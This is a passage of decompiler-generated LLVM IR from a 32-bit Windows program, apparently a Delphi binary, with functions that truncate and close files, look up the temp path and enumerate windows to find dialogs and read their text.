  br i1 %38, label %dec_label_pc_406b25, label %dec_label_pc_406b54, !insn.addr !1610

dec_label_pc_406b54:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b0a
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1591
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1611
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1612
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1612
  store i32 0, i32* %42, align 4, !insn.addr !1612
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1613
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1613
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1613
  store i32 %45, i32* %44, align 4, !insn.addr !1613
  %46 = call i32 @function_4034c8(), !insn.addr !1614
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1615
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1615
  store i32 %46, i32* %48, align 4, !insn.addr !1615
  %49 = call i32 @function_403720(), !insn.addr !1616
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1617
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1617
  store i32 %49, i32* %51, align 4, !insn.addr !1617
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1618
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1618
  store i32 %39, i32* %53, align 4, !insn.addr !1618
  %54 = call i32 @function_40446c(), !insn.addr !1619
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1620
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1620
  store i32 %39, i32* %56, align 4, !insn.addr !1620
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1621
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1622
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1622
  store i32 %39, i32* %59, align 4, !insn.addr !1622
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1623
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1624
  br label %dec_label_pc_406b89, !insn.addr !1624

dec_label_pc_406b89:                              ; preds = %dec_label_pc_406b54, %dec_label_pc_406ace, %dec_label_pc_406aa0
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1625
  %62 = load i32, i32* %61, align 4, !insn.addr !1625
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1626
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1627
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1627
  store i32 4221867, i32* %64, align 4, !insn.addr !1627
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1628
  ret i32 %65, !insn.addr !1629
}

define i32 @function_406ba4() local_unnamed_addr {
dec_label_pc_406ba4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1630
  ret i32 %0, !insn.addr !1630
}

define i32 @function_406ba9() local_unnamed_addr {
dec_label_pc_406ba9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1631
}

define i32 @function_406bab(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1632
}

define i32 @function_406be0() local_unnamed_addr {
dec_label_pc_406be0:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1633
  %1 = call i32 @function_4036b8(), !insn.addr !1634
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1635
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1635
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1635
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1636
  %4 = call i32 @function_403c90(), !insn.addr !1637
  %5 = icmp slt i32 %4, 0, !insn.addr !1638
  br i1 %5, label %dec_label_pc_406c68, label %dec_label_pc_406c36, !insn.addr !1639

dec_label_pc_406c36:                              ; preds = %dec_label_pc_406be0
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1640
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1641
  br label %dec_label_pc_406cb4

dec_label_pc_406c68:                              ; preds = %dec_label_pc_406be0
  %8 = call i32 @function_403c88(), !insn.addr !1642
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1643
  %10 = call i32 @function_403c90(), !insn.addr !1644
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1645
  %12 = call i32 @function_403c90(), !insn.addr !1646
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1647
  %14 = call i32 @function_406aa0(), !insn.addr !1648
  br label %dec_label_pc_406cb4, !insn.addr !1648

dec_label_pc_406cb4:                              ; preds = %dec_label_pc_406c36, %dec_label_pc_406c68
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1649
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1650
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1651
  ret i32 %16, !insn.addr !1652
}

define i32 @function_406ccf() local_unnamed_addr {
dec_label_pc_406ccf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1653
  ret i32 %0, !insn.addr !1653
}

define i32 @function_406cd4() local_unnamed_addr {
dec_label_pc_406cd4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1654
}

define i32 @function_406cd6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406cd6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1655
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1655
  %3 = load i32, i32* %2, align 4, !insn.addr !1655
  ret i32 %3, !insn.addr !1656
}

define i32 @function_406ce0() local_unnamed_addr {
dec_label_pc_406ce0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1657
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1657
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1657
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1658
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1659
  %3 = add i32 %2, 1, !insn.addr !1659
  %4 = icmp eq i32 %3, 0, !insn.addr !1659
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1659
  %5 = icmp eq i1 %4, false, !insn.addr !1660
  br i1 %5, label %dec_label_pc_406d18, label %dec_label_pc_406cf9, !insn.addr !1660

dec_label_pc_406cf9:                              ; preds = %dec_label_pc_406ce0
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1661
  %7 = icmp eq i32 %6, 0, !insn.addr !1661
  br i1 %7, label %dec_label_pc_406d08, label %dec_label_pc_406d03, !insn.addr !1662

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cf9
  %8 = call i32 @function_406aa0(), !insn.addr !1663
  br label %dec_label_pc_406d08, !insn.addr !1663

dec_label_pc_406d08:                              ; preds = %dec_label_pc_406d03, %dec_label_pc_406cf9
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1664
  br label %dec_label_pc_406d18, !insn.addr !1664

dec_label_pc_406d18:                              ; preds = %dec_label_pc_406d08, %dec_label_pc_406ce0
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1665
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1666
  ret i32 0, !insn.addr !1667
}

define i32 @function_406d26() local_unnamed_addr {
dec_label_pc_406d26:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1668
  ret i32 %0, !insn.addr !1668
}

define i32 @function_406d2b() local_unnamed_addr {
dec_label_pc_406d2b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1669
}

define i32 @function_406d2d(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1670
}

define i32 @function_406d30() local_unnamed_addr {
dec_label_pc_406d30:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1671
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1671
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1671
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1672
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1673
  %3 = add i32 %2, -1, !insn.addr !1673
  %4 = icmp eq i32 %2, 0, !insn.addr !1673
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1673
  %5 = icmp eq i1 %4, false, !insn.addr !1674
  br i1 %5, label %dec_label_pc_406d64, label %dec_label_pc_406d4a, !insn.addr !1674

dec_label_pc_406d4a:                              ; preds = %dec_label_pc_406d30
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1675
  br label %dec_label_pc_406d64, !insn.addr !1676

dec_label_pc_406d64:                              ; preds = %dec_label_pc_406d4a, %dec_label_pc_406d30
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1677
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1678
  ret i32 0, !insn.addr !1679
}

define i32 @function_406d72() local_unnamed_addr {
dec_label_pc_406d72:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1680
  ret i32 %0, !insn.addr !1680
}

define i32 @function_406d77() local_unnamed_addr {
dec_label_pc_406d77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1681
}

define i32 @function_406d79(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d79:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1682
}

define i1 @function_406d7c(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406d7c:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1683
  ret i1 %0, !insn.addr !1683
}

define i32 @function_406d84() local_unnamed_addr {
dec_label_pc_406d84:
  %eax.0.reg2mem = alloca i32, !insn.addr !1684
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1685
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1686
  %2 = icmp eq i32 %1, 0, !insn.addr !1687
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1688
  br i1 %2, label %dec_label_pc_406dba, label %dec_label_pc_406d9c, !insn.addr !1688

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d84
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1685
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1689
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1689
  %7 = load i8, i8* %6, align 1, !insn.addr !1689
  %8 = icmp eq i8 %7, 92, !insn.addr !1689
  br i1 %8, label %dec_label_pc_406dac, label %dec_label_pc_406da3, !insn.addr !1690

dec_label_pc_406da3:                              ; preds = %dec_label_pc_406d9c
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1691
  store i8 92, i8* %9, align 1, !insn.addr !1691
  %10 = or i32 %3, 1, !insn.addr !1692
  %11 = add i32 %1, %10, !insn.addr !1692
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1692
  store i8 0, i8* %12, align 1, !insn.addr !1692
  br label %dec_label_pc_406dac, !insn.addr !1692

dec_label_pc_406dac:                              ; preds = %dec_label_pc_406da3, %dec_label_pc_406d9c
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1693
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1693
  br label %dec_label_pc_406dba, !insn.addr !1693

dec_label_pc_406dba:                              ; preds = %dec_label_pc_406dac, %dec_label_pc_406d84
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1694
}

define i32 @function_406dc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406dc4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1695
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1696
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1697
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1697
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1697
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1698
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1699
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1699
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1700
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1700
  %5 = icmp eq i1 %4, false, !insn.addr !1701
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1702
  br i1 %5, label %dec_label_pc_406e7b, label %dec_label_pc_406dfb, !insn.addr !1702

dec_label_pc_406dfb:                              ; preds = %dec_label_pc_406dc4
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1703
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1703
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1704
  %8 = icmp eq i32 %7, 32770, !insn.addr !1705
  %9 = icmp eq i1 %8, false, !insn.addr !1706
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1706
  br i1 %9, label %dec_label_pc_406e7b, label %dec_label_pc_406e0a, !insn.addr !1706

dec_label_pc_406e0a:                              ; preds = %dec_label_pc_406dfb
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1707
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1707
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1708
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1708
  %13 = add i32 %arg1, 4, !insn.addr !1709
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1709
  %15 = load i32, i32* %14, align 4, !insn.addr !1709
  %16 = icmp eq i32 %15, %12, !insn.addr !1709
  %17 = icmp eq i1 %16, false, !insn.addr !1710
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1710
  br i1 %17, label %dec_label_pc_406e7b, label %dec_label_pc_406e15, !insn.addr !1710

dec_label_pc_406e15:                              ; preds = %dec_label_pc_406e0a
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1711
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1711
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1712
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1713
  %21 = load i32, i32* %20, align 4, !insn.addr !1713
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1714
  %23 = icmp eq i32 %21, %22, !insn.addr !1714
  %24 = icmp eq i1 %23, false, !insn.addr !1715
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1715
  br i1 %24, label %dec_label_pc_406e7b, label %dec_label_pc_406e26, !insn.addr !1715

dec_label_pc_406e26:                              ; preds = %dec_label_pc_406e15
  %25 = add i32 %arg1, 8, !insn.addr !1716
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1716
  %27 = load i32, i32* %26, align 4, !insn.addr !1716
  %28 = icmp eq i32 %27, 0, !insn.addr !1716
  br i1 %28, label %dec_label_pc_406e50, label %dec_label_pc_406e2c, !insn.addr !1717

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e26
  %29 = call i32 @function_406f9c(), !insn.addr !1718
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1719
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1720
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406e7b

dec_label_pc_406e50:                              ; preds = %dec_label_pc_406e26
  %32 = add i32 %arg1, 12, !insn.addr !1721
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1721
  %34 = load i32, i32* %33, align 4, !insn.addr !1721
  %35 = add i32 %arg1, 16, !insn.addr !1722
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1722
  %37 = load i32, i32* %36, align 4, !insn.addr !1722
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1723
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1723
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1723
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1723
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1723
  %43 = add i32 %arg1, 24, !insn.addr !1724
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1724
  store i32 %42, i32* %44, align 4, !insn.addr !1724
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1725
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1725
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1726
  %47 = icmp eq i1 %46, false, !insn.addr !1727
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1728
  br i1 %47, label %dec_label_pc_406e7b, label %dec_label_pc_406e76, !insn.addr !1728

dec_label_pc_406e76:                              ; preds = %dec_label_pc_406e50
  %48 = add i32 %arg1, 20, !insn.addr !1729
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1729
  store i32 %arg2, i32* %49, align 4, !insn.addr !1729
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1730
  br label %dec_label_pc_406e7b, !insn.addr !1730

dec_label_pc_406e7b:                              ; preds = %dec_label_pc_406e2c, %dec_label_pc_406e76, %dec_label_pc_406e50, %dec_label_pc_406e15, %dec_label_pc_406e0a, %dec_label_pc_406dfb, %dec_label_pc_406dc4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1731
  %51 = load i32, i32* %50, align 4, !insn.addr !1731
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1732
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1733
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1733
  store i32 4222621, i32* %53, align 4, !insn.addr !1733
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1734
  ret i32 %54, !insn.addr !1735
}

define i32 @function_406e96() local_unnamed_addr {
dec_label_pc_406e96:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1736
  ret i32 %0, !insn.addr !1736
}

define i32 @function_406e9b() local_unnamed_addr {
dec_label_pc_406e9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1737
}

define i32 @function_406e9d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406e9d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1738
}

define i32 @function_406ea8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ea8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1739
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1740
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1741
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1741
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1741
  %6 = call i32 @function_40441c(), !insn.addr !1742
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1743
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1744
  br label %dec_label_pc_406eec, !insn.addr !1744

dec_label_pc_406eec:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406ea8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1743
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1743
  store i32 %7, i32* %9, align 4, !insn.addr !1743
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1745
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1745
  store i32 4222404, i32* %11, align 4, !insn.addr !1745
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1746
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1747
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1747
  store i32 1, i32* %14, align 4, !insn.addr !1747
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1748
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1749
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1749
  store i32 0, i32* %16, align 4, !insn.addr !1749
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1750
  %18 = icmp eq i1 %17, false, !insn.addr !1751
  %19 = icmp eq i1 %18, false, !insn.addr !1752
  br i1 %19, label %dec_label_pc_406f16, label %dec_label_pc_406f0b, !insn.addr !1752

dec_label_pc_406f0b:                              ; preds = %dec_label_pc_406eec
  %20 = call i32 @function_40441c(), !insn.addr !1753
  %21 = sub i32 %20, %6, !insn.addr !1754
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1755
  %23 = icmp eq i1 %22, false, !insn.addr !1756
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1756
  br i1 %23, label %dec_label_pc_406eec, label %dec_label_pc_406f16, !insn.addr !1756

dec_label_pc_406f16:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406eec
  ret i32 0, !insn.addr !1757
}

define i32 @function_406f30() local_unnamed_addr {
dec_label_pc_406f30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1758
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1759
}

define i32 @function_406f48(i32 %arg1) local_unnamed_addr {
dec_label_pc_406f48:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1760
  %edi.0.reg2mem = alloca i32, !insn.addr !1760
  %ecx.0.reg2mem = alloca i32, !insn.addr !1760
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1761
  br label %2, !insn.addr !1761

; <label>:2:                                      ; preds = %4, %dec_label_pc_406f48
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1761
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1761
  br i1 %3, label %10, label %4, !insn.addr !1761

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1761
  %6 = load i8, i8* %5, align 1, !insn.addr !1761
  %7 = icmp eq i8 %6, 0, !insn.addr !1761
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1761
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1761
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1761
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1761
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1761
  br i1 %7, label %10, label %2, !insn.addr !1761

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1762
  ret i32 %11, !insn.addr !1763
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_406f9c() local_unnamed_addr {
dec_label_pc_406f9c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1764
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1765
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1765
  %4 = add i32 %3, %1, !insn.addr !1766
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1766
  store i8 0, i8* %5, align 1, !insn.addr !1766
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1767
  ret i32 %6, !insn.addr !1768
}

define i32 @function_406fd0() local_unnamed_addr {
dec_label_pc_406fd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1769
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1770
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1771
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1771
  %6 = add i32 %5, %3, !insn.addr !1772
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1772
  store i8 0, i8* %7, align 1, !insn.addr !1772
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1773
  ret i32 %8, !insn.addr !1774
}

define i32 @function_407008() local_unnamed_addr {
dec_label_pc_407008:
  %0 = call i32 @function_4034c8(), !insn.addr !1775
  %1 = call i32 @function_4034c8(), !insn.addr !1776
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1777
  ret i32 %2, !insn.addr !1778
}

define i32 @function_407048() local_unnamed_addr {
dec_label_pc_407048:
  %0 = call i32 @function_4034c8(), !insn.addr !1779
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1780
  ret i32 %1, !insn.addr !1781
}

define i32 @function_407080() local_unnamed_addr {
dec_label_pc_407080:
  %0 = call i32 @function_4036c8(), !insn.addr !1782
  %1 = call i32 @function_4036c8(), !insn.addr !1783
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1784
  %3 = icmp eq i32 %2, 2, !insn.addr !1785
  %4 = zext i1 %3 to i32, !insn.addr !1786
  %5 = and i32 %2, -256, !insn.addr !1786
  %6 = or i32 %5, %4, !insn.addr !1786
  ret i32 %6, !insn.addr !1787
}

define i32 @function_4070b0() local_unnamed_addr {
dec_label_pc_4070b0:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1788
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1788
  %esp.02.reg2mem = alloca i32, !insn.addr !1788
  %storemerge3.reg2mem = alloca i32, !insn.addr !1788
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1789
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1789
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1789
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1790
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1791
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1792
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1792
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1793
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1793
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1793
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1794
  %9 = icmp eq i1 %8, false, !insn.addr !1795
  %10 = icmp eq i1 %9, false, !insn.addr !1796
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1796
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1796
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1796
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1796
  br i1 %10, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1796

dec_label_pc_4070d4:                              ; preds = %dec_label_pc_4070b0, %dec_label_pc_4070d4
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_406f9c(), !insn.addr !1797
  %12 = call i32 @function_4070b0(), !insn.addr !1798
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1799
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1799
  store i32 2, i32* %14, align 4, !insn.addr !1799
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1800
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1800
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1800
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1801
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1793
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1793
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1794
  %21 = icmp eq i1 %20, false, !insn.addr !1795
  %22 = icmp eq i1 %21, false, !insn.addr !1796
